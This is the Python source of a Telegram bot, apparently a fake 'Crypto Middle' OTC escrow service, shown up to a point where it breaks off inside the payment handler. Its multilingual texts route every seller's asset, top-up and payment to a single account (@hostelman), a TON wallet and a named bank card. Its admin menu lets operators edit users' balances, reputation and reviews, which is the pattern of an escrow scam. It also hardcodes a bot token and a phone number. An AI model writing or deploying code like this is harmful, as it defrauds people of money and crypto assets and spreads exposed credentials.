import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command

BOT_TOKEN = "8752155017:AAHoh1cieV0hgU7dndGJAWrCWXJ9fEJkXfE"
ADMIN_IDS = [174415647, 713129783]

MIDDLE_USERNAME = "@hostelman"
SUPPORT_USERNAME = "@hostelman"
TON_ADDRESS = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
CARD_INFO = "ВТБ Банк | +89041751408 Александр Ф."

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_data = {}
deals = {}
deal_counter = [1000]

LANGS = {
    "ru": {
        "flag": "🇷🇺", "name": "Русский",
        "welcome": (
            "Добро пожаловать 👋\n\n"
            "💼 <b>Crypto Middle</b> — специализированный сервис безопасных внебиржевых сделок.\n\n"
            "✨ Автоматизированный алгоритм исполнения.\n"
            "⚡️ Скорость и автоматизация.\n"
            "💳 Удобный и быстрый вывод средств.\n\n"
            "• Комиссия: <b>0%</b>\n"
            "• Режим работы: <b>24/7</b>\n"
            "• Поддержка: <b>@hostelman</b>"
        ),
        "btn_deal": "🔐 Создать Сделку",
        "btn_req": "🧾 Реквизиты",
        "btn_topup": "💰 Пополнить баланс",
        "btn_withdraw": "💸 Вывести средства",
        "btn_security": "🛡 Безопасность",
        "btn_support": "📋 Поддержка",
        "btn_language": "🌐 Язык",
        "btn_menu": "📱 В меню",
        "btn_cancel": "❌ Отмена",
        "btn_confirm_agreement": "📍 Подтвердить Ознакомление",
        "btn_paid": "💸 Я оплатил",
        "agreement": (
            "☑️ <b>Пользовательское соглашение</b>\n\n"
            "🛡️ Для сохранности ваших активов строго соблюдайте регламент:\n\n"
            "<b>• Депонирование активов:</b>\n"
            "Передача только через официальный контакт: <b>@hostelman</b>\n\n"
            "<b>• Запрет прямых расчетов:</b>\n"
            "Категорически запрещено отправлять средства напрямую.\n\n"
            "<b>• Завершение сделки:</b>\n"
            "Вывод производится автоматически после подтверждения получения.\n\n"
            "Нажмите кнопку ниже для подтверждения."
        ),
        "deal_step1": "📝 <b>Создание сделки — Шаг 1/4</b>\n\nВведите <b>@username второго участника сделки</b>:\n\nПример: <code>@username</code>",
        "deal_step2": "📝 <b>Создание сделки — Шаг 2/4</b>\n\nВведите <b>суть сделки</b>:",
        "deal_step3": "📝 <b>Создание сделки — Шаг 3/4</b>\n\nВведите <b>сумму сделки</b>:",
        "deal_step4": "📝 <b>Создание сделки — Шаг 4/4</b>\n\nВ чём хотите получить оплату?",
        "deal_created": (
            "✅ <b>Сделка успешно создана!</b>\n\n"
            "🆔 ID сделки: <code>{deal_id}</code>\n"
            "👤 Второй участник: <b>{partner}</b>\n"
            "📋 Суть сделки: {description}\n"
            "💵 Сумма: <b>{amount}</b>\n"
            "💱 Валюта: <b>{currency}</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📦 <b>КАК ПРОХОДИТ СДЕЛКА:</b>\n\n"
            "1️⃣ <b>Продавец</b> передаёт товар/актив менеджеру:\n"
            "     👉 <b>@hostelman</b>\n\n"
            "2️⃣ Менеджер проверяет получение в течение <b>5 минут</b> и подтверждает\n\n"
            "3️⃣ После подтверждения <b>Покупатель</b> отправляет оплату\n\n"
            "4️⃣ Менеджер верифицирует оплату и передаёт актив покупателю\n\n"
            "⚠️ <b>ВАЖНО:</b> Никогда не передавайте активы напрямую!\n"
            "Только через менеджера: <b>@hostelman</b>\n\n"
            "⏱ Среднее время сделки: <b>5–15 минут</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔗 Ссылка для второго участника:\n"
            "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
            "⏳ Статус: <b>Ожидание оплаты</b>"
        ),
        "deal_info": (
            "📋 <b>Информация о сделке</b>\n\n"
            "🆔 ID сделки: <code>{deal_id}</code>\n"
            "📝 Суть: {description}\n"
            "💵 Сумма: <b>{amount}</b>\n"
            "💱 Валюта: <b>{currency}</b>\n"
            "🔘 Статус: <b>Активна</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📦 <b>КАК ПРОХОДИТ СДЕЛКА:</b>\n\n"
            "1️⃣ <b>Продавец</b> передаёт товар/актив менеджеру:\n"
            "     👉 <b>@hostelman</b>\n\n"
            "2️⃣ Менеджер подтверждает получение в течение <b>5 минут</b>\n\n"
            "3️⃣ <b>Покупатель</b> отправляет оплату продавцу\n\n"
            "4️⃣ Менеджер верифицирует оплату и закрывает сделку\n\n"
            "⚠️ Передавайте активы только через <b>@hostelman</b>\n"
            "⏱ Среднее время: <b>5–15 минут</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 После оплаты нажмите кнопку <b>«Я оплатил»</b>"
        ),
        "btn_write_middle": "💬 Написать менеджеру",
        "own_deal": "⚠️ Это ваша собственная сделка.",
        "deal_not_found": "❌ Сделка не найдена или уже завершена.",
        "partner_notified": "👤 По вашей сделке <code>{deal_id}</code> перешёл участник: <b>{buyer}</b>",
        "paid_notify_admin": (
            "💸 <b>Пользователь сообщил об оплате!</b>\n\n"
            "🆔 Сделка: <code>{deal_id}</code>\n"
            "👤 Пользователь: {user}\n"
            "💵 Сумма: {amount} {currency}\n\n"
            "Подтвердите или отклоните получение:"
        ),
        "paid_notify_seller": "💸 <b>Покупатель сообщил об оплате</b> по сделке <code>{deal_id}</code>\n\nМенеджер проверяет оплату и передаст актив.",
        "paid_confirm": "✅ Уведомление об оплате отправлено менеджеру.\n\nМенеджер проверит и завершит сделку. Ожидайте подтверждения.",
        "deal_confirmed_user": "✅ <b>Оплата подтверждена менеджером!</b>\n\nСделка <code>{deal_id}</code> успешно завершена. Спасибо за использование Crypto Middle!",
        "deal_rejected_user": "❌ <b>Оплата отклонена менеджером</b> по сделке <code>{deal_id}</code>.\n\nОбратитесь в поддержку: @hostelman",
        "req_title": "🧾 <b>Реквизиты</b>\n\n💎 TON: <code>{ton}</code>\n💳 Карта: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
        "no_req": "📎 Реквизит для <b>{cur}</b> не добавлен. Добавьте и создайте сделку заново.",
        "ton_saved": "✅ TON кошелёк сохранён!",
        "card_saved": "✅ Карта сохранена!",
        "stars_saved": "✅ Username для Stars сохранён!",
        "redo_deal": "\n\nТеперь создайте сделку заново.",
        "enter_ton": "💎 Введите ваш <b>TON кошелёк</b>:",
        "enter_card": "💳 Введите <b>номер карты</b>:",
        "enter_stars": "⭐️ Введите ваш <b>Telegram username</b> для Stars:",
        "topup_title": "💰 <b>Пополнение баланса</b>\n\nВыберите способ:",
        "withdraw_text": "💸 <b>Вывод средств</b>\n\nОбратитесь в поддержку:\n👤 @hostelman\n\n⚠️ Укажите сумму и реквизиты.",
        "security": (
            "🛡 <b>БЕЗОПАСНОСТЬ ПРИ ПЕРЕДАЧЕ АКТИВОВ</b>\n\n"
            "Передача производится исключительно через: <b>@hostelman</b>\n\n"
            "<b>• Запрет прямых транзакций:</b> активы напрямую не передаются.\n"
            "<b>• Верификация:</b> сверяйте сумму и тег сделки.\n"
            "<b>• Завершение:</b> вывод после подтверждения обеими сторонами."
        ),
        "lang_choose": "🌐 <b>Выберите язык:</b>",
        "lang_set": "✅ Язык установлен: Русский 🇷🇺",
        "topup_stars": (
            "⭐️ <b>Пополнение Stars</b>\n\nПередайте Stars на: <b>@hostelman</b>\n\n"
            "• Перейдите в диалог и отправьте Stars.\n"
            "• Баланс пополнится автоматически.\n\n⏱ Зачисление: <b>5–15 минут</b>"
        ),
        "topup_ton": (
            "💎 <b>Пополнение TON</b>\n\n"
            "<code>UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc</code>\n\n"
            "После отправки напишите в поддержку: <b>@hostelman</b>\n\n⏱ Зачисление: <b>5–15 минут</b>"
        ),
        "topup_card": (
            "💳 <b>Пополнение картой</b>\n\nРеквизиты:\n"
            "<b>ВТБ Банк | +89041751408 Александр Ф.</b>\n\n"
            "• Сохраните чек.\n• Обратитесь в поддержку.\n\n⏱ Зачисление: <b>5–15 минут</b>"
        ),
        "topup_nft": (
            "🎁 <b>Пополнение NFT</b>\n\nПередайте актив: <b>@hostelman</b>\n\n"
            "• После верификации оценка в Stars или TON.\n\n⏱ Зачисление: <b>5–15 минут</b>"
        ),
        "invalid_username": "❌ Введите корректный @username (начинается с @):",
    },
    "en": {
        "flag": "🇬🇧", "name": "English",
        "welcome": (
            "Welcome 👋\n\n"
            "💼 <b>Crypto Middle</b> — secure OTC deal service.\n\n"
            "✨ Automated execution algorithm.\n"
            "⚡️ Speed and automation.\n"
            "💳 Fast and convenient withdrawal.\n\n"
            "• Commission: <b>0%</b>\n"
            "• Working hours: <b>24/7</b>\n"
            "• Support: <b>@hostelman</b>"
        ),
        "btn_deal": "🔐 Create Deal",
        "btn_req": "🧾 Requisites",
        "btn_topup": "💰 Top Up Balance",
        "btn_withdraw": "💸 Withdraw",
        "btn_security": "🛡 Security",
        "btn_support": "📋 Support",
        "btn_language": "🌐 Language",
        "btn_menu": "📱 Menu",
        "btn_cancel": "❌ Cancel",
        "btn_confirm_agreement": "📍 Confirm Agreement",
        "btn_paid": "💸 I Paid",
        "agreement": (
            "☑️ <b>User Agreement</b>\n\n"
            "🛡️ To protect your assets, follow the rules:\n\n"
            "<b>• Asset deposit:</b>\n"
            "Transfer only through: <b>@hostelman</b>\n\n"
            "<b>• No direct payments:</b>\n"
            "Sending funds directly is strictly prohibited.\n\n"
            "<b>• Deal completion:</b>\n"
            "Withdrawal is processed automatically after confirmation.\n\n"
            "Press the button below to confirm."
        ),
        "deal_step1": "📝 <b>Create Deal — Step 1/4</b>\n\nEnter the <b>@username of the second participant</b>:\n\nExample: <code>@username</code>",
        "deal_step2": "📝 <b>Create Deal — Step 2/4</b>\n\nDescribe the <b>deal</b>:",
        "deal_step3": "📝 <b>Create Deal — Step 3/4</b>\n\nEnter the <b>deal amount</b>:",
        "deal_step4": "📝 <b>Create Deal — Step 4/4</b>\n\nWhat currency do you want to receive?",
        "deal_created": (
            "✅ <b>Deal successfully created!</b>\n\n"
            "🆔 Deal ID: <code>{deal_id}</code>\n"
            "👤 Second participant: <b>{partner}</b>\n"
            "📋 Description: {description}\n"
            "💵 Amount: <b>{amount}</b>\n"
            "💱 Currency: <b>{currency}</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📦 <b>HOW THE DEAL WORKS:</b>\n\n"
            "1️⃣ <b>Seller</b> transfers asset to manager:\n"
            "     👉 <b>@hostelman</b>\n\n"
            "2️⃣ Manager confirms receipt within <b>5 minutes</b>\n\n"
            "3️⃣ <b>Buyer</b> sends payment\n\n"
            "4️⃣ Manager verifies and releases asset to buyer\n\n"
            "⚠️ <b>IMPORTANT:</b> Never transfer directly!\n"
            "Only through manager: <b>@hostelman</b>\n\n"
            "⏱ Average time: <b>5–15 minutes</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔗 Link for second participant:\n"
            "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
            "⏳ Status: <b>Awaiting payment</b>"
        ),
        "deal_info": (
            "📋 <b>Deal Information</b>\n\n"
            "🆔 Deal ID: <code>{deal_id}</code>\n"
            "📝 Description: {description}\n"
            "💵 Amount: <b>{amount}</b>\n"
            "💱 Currency: <b>{currency}</b>\n"
            "🔘 Status: <b>Active</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📦 <b>HOW THE DEAL WORKS:</b>\n\n"
            "1️⃣ <b>Seller</b> transfers asset to manager:\n"
            "     👉 <b>@hostelman</b>\n\n"
            "2️⃣ Manager confirms receipt within <b>5 minutes</b>\n\n"
            "3️⃣ <b>Buyer</b> sends payment to seller\n\n"
            "4️⃣ Manager verifies and closes the deal\n\n"
            "⚠️ Transfer only through <b>@hostelman</b>\n"
            "⏱ Average: <b>5–15 minutes</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 After paying press <b>«I Paid»</b> button"
        ),
        "btn_write_middle": "💬 Write to Manager",
        "own_deal": "⚠️ This is your own deal.",
        "deal_not_found": "❌ Deal not found or already closed.",
        "partner_notified": "👤 User <b>{buyer}</b> joined your deal <code>{deal_id}</code>",
        "paid_notify_admin": (
            "💸 <b>User reported payment!</b>\n\n"
            "🆔 Deal: <code>{deal_id}</code>\n"
            "👤 User: {user}\n"
            "💵 Amount: {amount} {currency}\n\n"
            "Confirm or reject receipt:"
        ),
        "paid_notify_seller": "💸 <b>Buyer reported payment</b> for deal <code>{deal_id}</code>\n\nManager is verifying payment.",
        "paid_confirm": "✅ Payment notification sent to manager.\n\nManager will verify and complete the deal. Please wait.",
        "deal_confirmed_user": "✅ <b>Payment confirmed by manager!</b>\n\nDeal <code>{deal_id}</code> successfully completed. Thank you for using Crypto Middle!",
        "deal_rejected_user": "❌ <b>Payment rejected by manager</b> for deal <code>{deal_id}</code>.\n\nContact support: @hostelman",
        "req_title": "🧾 <b>Requisites</b>\n\n💎 TON: <code>{ton}</code>\n💳 Card: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
        "no_req": "📎 Requisite for <b>{cur}</b> not added.",
        "ton_saved": "✅ TON wallet saved!",
        "card_saved": "✅ Card saved!",
        "stars_saved": "✅ Stars username saved!",
        "redo_deal": "\n\nNow create the deal again.",
        "enter_ton": "💎 Enter your <b>TON wallet</b>:",
        "enter_card": "💳 Enter your <b>card number</b>:",
        "enter_stars": "⭐️ Enter your <b>Telegram username</b> for Stars:",
        "topup_title": "💰 <b>Top Up Balance</b>\n\nChoose method:",
        "withdraw_text": "💸 <b>Withdrawal</b>\n\nContact support:\n👤 @hostelman",
        "security": (
            "🛡 <b>ASSET TRANSFER SECURITY</b>\n\n"
            "Transfer exclusively through: <b>@hostelman</b>\n\n"
            "<b>• No direct transactions.</b>\n"
            "<b>• Verification:</b> check amount and deal tag.\n"
            "<b>• Completion:</b> after both sides confirm."
        ),
        "lang_choose": "🌐 <b>Choose language:</b>",
        "lang_set": "✅ Language set: English 🇬🇧",
        "topup_stars": "⭐️ <b>Top Up with Stars</b>\n\nSend Stars to: <b>@hostelman</b>\n\n⏱ <b>5–15 minutes</b>",
        "topup_ton": (
            "💎 <b>Top Up with TON</b>\n\n"
            "<code>UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc</code>\n\n"
            "After sending contact: <b>@hostelman</b>\n\n⏱ <b>5–15 minutes</b>"
        ),
        "topup_card": (
            "💳 <b>Top Up with Card</b>\n\n"
            "<b>VTB Bank | +89041751408 Alexander F.</b>\n\n"
            "• Save receipt.\n• Contact support.\n\n⏱ <b>5–15 minutes</b>"
        ),
        "topup_nft": "🎁 <b>Top Up with NFT</b>\n\nTransfer to: <b>@hostelman</b>\n\n⏱ <b>5–15 minutes</b>",
        "invalid_username": "❌ Enter a valid @username:",
    },
}

for lang_code in ["az", "tr", "kz", "ua"]:
    if lang_code not in LANGS:
        LANGS[lang_code] = dict(LANGS["ru"])
    LANGS[lang_code]["btn_paid"] = "💸 Я оплатил" if lang_code in ("kz", "ua") else "💸 Ödədim" if lang_code == "az" else "💸 Ödedim"
    LANGS[lang_code]["paid_notify_admin"] = LANGS["ru"]["paid_notify_admin"]
    LANGS[lang_code]["paid_notify_seller"] = LANGS["ru"]["paid_notify_seller"]
    LANGS[lang_code]["paid_confirm"] = LANGS["ru"]["paid_confirm"]
    LANGS[lang_code]["deal_confirmed_user"] = LANGS["ru"]["deal_confirmed_user"]
    LANGS[lang_code]["deal_rejected_user"] = LANGS["ru"]["deal_rejected_user"]
    LANGS[lang_code]["topup_ton"] = (
        "💎 TON:\n<code>UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc</code>\n\n"
        "@hostelman\n\n⏱ <b>5–15 мин</b>"
    )
    LANGS[lang_code]["topup_card"] = "💳 <b>ВТБ Банк | +89041751408 Александр Ф.</b>\n\n⏱ <b>5–15 мин</b>"


def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {"ton_wallet": "", "card": "", "username_stars": "", "has_requisites": False,
                          "balance": 0.0, "reputation": 0, "deals_count": 0, "reviews": [], "lang": "ru"}
    return user_data[uid]

def get_lang(uid):
    return get_user(uid).get("lang", "ru")

def L(uid, key, **kwargs):
    lang = get_lang(uid)
    text = LANGS.get(lang, LANGS["ru"]).get(key, LANGS["ru"].get(key, key))
    if kwargs:
        text = text.format(**kwargs)
    return text

def gen_deal_id():
    deal_counter[0] += 1
    return f"CD{deal_counter[0]}"

username_map = {}

def find_uid(query: str):
    q = query.strip()
    if q.startswith("@"):
        return username_map.get(q[1:].lower())
    try:
        uid = int(q)
        return uid if uid in user_data else None
    except ValueError:
        return None

class SetBanner(StatesGroup):
    waiting = State()

class AddReq(StatesGroup):
    ton = State()
    card = State()
    stars = State()

class Deal(StatesGroup):
    partner = State()
    description = State()
    amount = State()
    currency = State()

class AdminAction(StatesGroup):
    reputation = State()
    balance = State()
    review = State()

def main_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_deal"), callback_data="deal"),
         InlineKeyboardButton(text=L(uid, "btn_req"), callback_data="requisites")],
        [InlineKeyboardButton(text=L(uid, "btn_topup"), callback_data="topup"),
         InlineKeyboardButton(text=L(uid, "btn_withdraw"), callback_data="withdraw")],
        [InlineKeyboardButton(text=L(uid, "btn_security"), callback_data="security"),
         InlineKeyboardButton(text=L(uid, "btn_support"), url="https://t.me/hostelman")],
        [InlineKeyboardButton(text=L(uid, "btn_language"), callback_data="language")],
    ])

def back_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=L(uid, "btn_support"), url="https://t.me/hostelman")],
    ])

def cancel_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_cancel"), callback_data="menu")]
    ])

def agreement_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_confirm_agreement"), callback_data="confirm_agreement")],
        [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=L(uid, "btn_support"), url="https://t.me/hostelman")],
    ])

def currency_kb(uid):
    lang = get_lang(uid)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="deal_cur_ton"),
         InlineKeyboardButton(text="⭐️ Stars", callback_data="deal_cur_stars")],
        [InlineKeyboardButton(text="💳 " + ("Карта (RUB)" if lang in ("ru", "kz", "ua") else "Card (RUB)"), callback_data="deal_cur_card"),
         InlineKeyboardButton(text="🎁 NFT", callback_data="deal_cur_nft")],
        [InlineKeyboardButton(text=L(uid, "btn_cancel"), callback_data="menu")],
    ])

def deal_created_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_paid"), callback_data=f"paid_{deal_id}"),
         InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=L(uid, "btn_write_middle"), url="https://t.me/hostelman")],
    ])

def deal_info_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_paid"), callback_data=f"paid_{deal_id}"),
         InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=L(uid, "btn_write_middle"), url="https://t.me/hostelman")],
    ])

def admin_deal_confirm_kb(deal_id, buyer_uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_ok_{deal_id}_{buyer_uid}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"adm_no_{deal_id}_{buyer_uid}"),
        ]
    ])

def req_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="req_ton"),
         InlineKeyboardButton(text="💳 " + ("Карта" if get_lang(uid) in ("ru", "kz", "ua") else "Card"), callback_data="req_card")],
        [InlineKeyboardButton(text="⭐️ Username Stars", callback_data="req_stars")],
        [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
    ])

def add_req_kb(uid, req_type):
    add_text = {"ru": "Добавить", "en": "Add", "az": "Əlavə et", "tr": "Ekle", "kz": "Қосу", "ua": "Додати"}
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ " + add_text.get(get_lang(uid), "Добавить"), callback_data=f"req_{req_type}_deal")],
        [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
    ])

def topup_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐️ Stars", callback_data="topup_stars"),
         InlineKeyboardButton(text="💎 TON", callback_data="topup_ton")],
        [InlineKeyboardButton(text="💳 " + ("Карта" if get_lang(uid) in ("ru", "kz", "ua") else "Card"), callback_data="topup_card"),
         InlineKeyboardButton(text="🎁 NFT", callback_data="topup_nft")],
        [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=L(uid, "btn_support"), url="https://t.me/hostelman")],
    ])

def topup_paid_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid, "btn_paid"), callback_data="paid_topup"),
         InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=L(uid, "btn_support"), url="https://t.me/hostelman")],
    ])

def language_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru"),
         InlineKeyboardButton(text="🇬🇧 English", callback_data="setlang_en")],
        [InlineKeyboardButton(text="🇦🇿 Azərbaycanca", callback_data="setlang_az"),
         InlineKeyboardButton(text="🇹🇷 Türkçe", callback_data="setlang_tr")],
        [InlineKeyboardButton(text="🇰🇿 Қазақша", callback_data="setlang_kz"),
         InlineKeyboardButton(text="🇺🇦 Українська", callback_data="setlang_ua")],
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 Баннер", callback_data="adm_banner"),
         InlineKeyboardButton(text="📊 Статистика", callback_data="adm_stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="adm_users"),
         InlineKeyboardButton(text="⭐️ Репутация", callback_data="adm_reputation")],
        [InlineKeyboardButton(text="💬 Отзыв", callback_data="adm_review"),
         InlineKeyboardButton(text="💰 Баланс", callback_data="adm_balance")],
        [InlineKeyboardButton(text="📋 Сделки", callback_data="adm_deals")],
    ])

async def safe_delete(msg):
    try:
        await msg.delete()
    except Exception:
        pass

async def show_menu(message: Message, uid: int):
    banner = user_data.get("_banner")
    welcome = L(uid, "welcome")
    kb = main_kb(uid)
    if banner:
        await message.answer_photo(photo=banner["photo_id"],
                                   caption=banner.get("caption") or welcome,
                                   parse_mode="HTML", reply_markup=kb)
    else:
        await message.answer(welcome, parse_mode="HTML", reply_markup=kb)

def _reg(msg: Message):
    if msg.from_user and msg.from_user.username:
        username_map[msg.from_user.username.lower()] = msg.from_user.id


@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)
    if message.from_user.username:
        username_map[message.from_user.username.lower()] = uid
    await safe_delete(message)

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].replace("deal_", "", 1)
        if deal_id in deals:
            deal = deals[deal_id]
            if deal["uid"] == uid:
                await message.answer(L(uid, "own_deal"), reply_markup=main_kb(uid))
                return
            buyer_name = f"@{message.from_user.username}" if message.from_user.username else f"ID: {uid}"
            deal_text = L(uid, "deal_info",
                          deal_id=deal_id,
                          description=deal["description"],
                          amount=deal["amount"],
                          currency=deal["currency"])
            await message.answer(deal_text, parse_mode="HTML", reply_markup=deal_info_kb(uid, deal_id))
            try:
                seller_uid = deal["uid"]
                await bot.send_message(seller_uid, L(seller_uid, "partner_notified", deal_id=deal_id, buyer=buyer_name), parse_mode="HTML")
            except Exception:
                pass
        else:
            await message.answer(L(uid, "deal_not_found"), reply_markup=main_kb(uid))
        return

    await show_menu(message, uid)


@dp.callback_query(F.data == "menu")
async def cb_menu(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await state.clear()
    await safe_delete(callback.message)
    await show_menu(callback.message, uid)
    await callback.answer()


@dp.callback_query(F.data == "language")
async def cb_language(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "lang_choose"), parse_mode="HTML", reply_markup=language_kb())
    await callback.answer()


@dp.callback_query(F.data.startswith("setlang_"))
async def cb_setlang(callback: CallbackQuery):
    uid = callback.from_user.id
    lang_code = callback.data.replace("setlang_", "")
    get_user(uid)["lang"] = lang_code
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "lang_set"), parse_mode="HTML")
    await show_menu(callback.message, uid)
    await callback.answer()


@dp.callback_query(F.data == "security")
async def cb_security(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "security"), parse_mode="HTML",
                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                      [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")]
                                  ]))
    await callback.answer()


@dp.callback_query(F.data == "deal")
async def cb_deal(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "agreement"), parse_mode="HTML", reply_markup=agreement_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "confirm_agreement")
async def cb_confirm(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "deal_step1"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(Deal.partner)
    await callback.answer()


@dp.message(Deal.partner)
async def deal_partner(message: Message, state: FSMContext):
    uid = message.from_user.id
    _reg(message)
    await safe_delete(message)
    text = message.text.strip()
    if not text.startswith("@"):
        await message.answer(L(uid, "invalid_username"), parse_mode="HTML", reply_markup=cancel_kb(uid))
        return
    await state.update_data(partner=text)
    await message.answer(L(uid, "deal_step2"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(Deal.description)


@dp.message(Deal.description)
async def deal_desc(message: Message, state: FSMContext):
    uid = message.from_user.id
    _reg(message)
    await safe_delete(message)
    await state.update_data(description=message.text)
    await message.answer(L(uid, "deal_step3"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(Deal.amount)


@dp.message(Deal.amount)
async def deal_amt(message: Message, state: FSMContext):
    uid = message.from_user.id
    _reg(message)
    await safe_delete(message)
    await state.update_data(amount=message.text)
    await message.answer(L(uid, "deal_step4"), parse_mode="HTML", reply_markup=currency_kb(uid))
    await state.set_state(Deal.currency)


@dp.callback_query(F.data.startswith("deal_cur_"))
async def deal_cur(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    cur_map = {
        "deal_cur_ton":   ("💎 TON",        "ton_wallet",     "ton"),
        "deal_cur_stars": ("⭐️ Stars",      "username_stars", "stars"),
        "deal_cur_card":  ("💳 Card (RUB)", "card",           "card"),
        "deal_cur_nft":   ("🎁 NFT",        None,             None),
    }
    cur_label, req_field, req_type = cur_map[callback.data]
    user = get_user(uid)

    if req_field and not user.get(req_field):
        await safe_delete(callback.message)
        await callback.message.answer(L(uid, "no_req", cur=cur_label), parse_mode="HTML", reply_markup=add_req_kb(uid, req_type))
        await state.clear()
        await callback.answer()
        return

    data = await state.get_data()
    deal_id = gen_deal_id()
    deals[deal_id] = {
        "uid": uid,
        "partner": data.get("partner", "—"),
        "description": data.get("description", "—"),
        "amount": data.get("amount", "—"),
        "currency": cur_label,
        "status": "active"
    }
    user["deals_count"] = user.get("deals_count", 0) + 1

    me = await bot.get_me()
    deal_text = L(uid, "deal_created",
                  deal_id=deal_id,
                  partner=data.get("partner", "—"),
                  description=data.get("description", "—"),
                  amount=data.get("amount", "—"),
                  currency=cur_label,
                  bot_username=me.username)

    await safe_delete(callback.message)
    await callback.message.answer(deal_text, parse_mode="HTML", reply_markup=deal_created_kb(uid, deal_id))

    uname = f"@{callback.from_user.username}" if callback.from_user.username else f"ID: {uid}"
    for admin_id in ADMIN_IDS:
        await bot.send_message(
            admin_id,
            f"🆕 <b>Новая сделка {deal_id}</b>\n\n"
            f"👤 {uname} | ID: <code>{uid}</code>\n"
            f"👥 Партнёр: {data.get('partner', '—')}\n"
            f"📋 Суть: {data.get('description', '—')}\n"
            f"💵 Сумма: {data.get('amount', '—')}\n"
            f"💱 Валюта: {cur_label}",
            parse_mode="HTML"
        )
    await state.clear()
    await callback.answer()


# ===================== КНОПКА "Я ОПЛАТИЛ" =====================
@dp.callback_query(F.data.startswith("paid_"))
async def cb_paid(callback: CallbackQuery):
    uid = callback.from_user.id
    deal_id = callback.data.replace("paid_", "")
    uname = f"@{callback.from_user.username}" if callback.from_user.username else f"ID: {uid}"

    if deal_id == "topup":
        for admin_id in ADMIN_IDS:
            await bot.send_message(
                admin_id,
                f"💸 <b>Пользователь сообщил об оплате (пополнение)</b>\n\n👤 {uname} | ID: <code>{uid}</code>",
                parse_mode="HTML"
            )
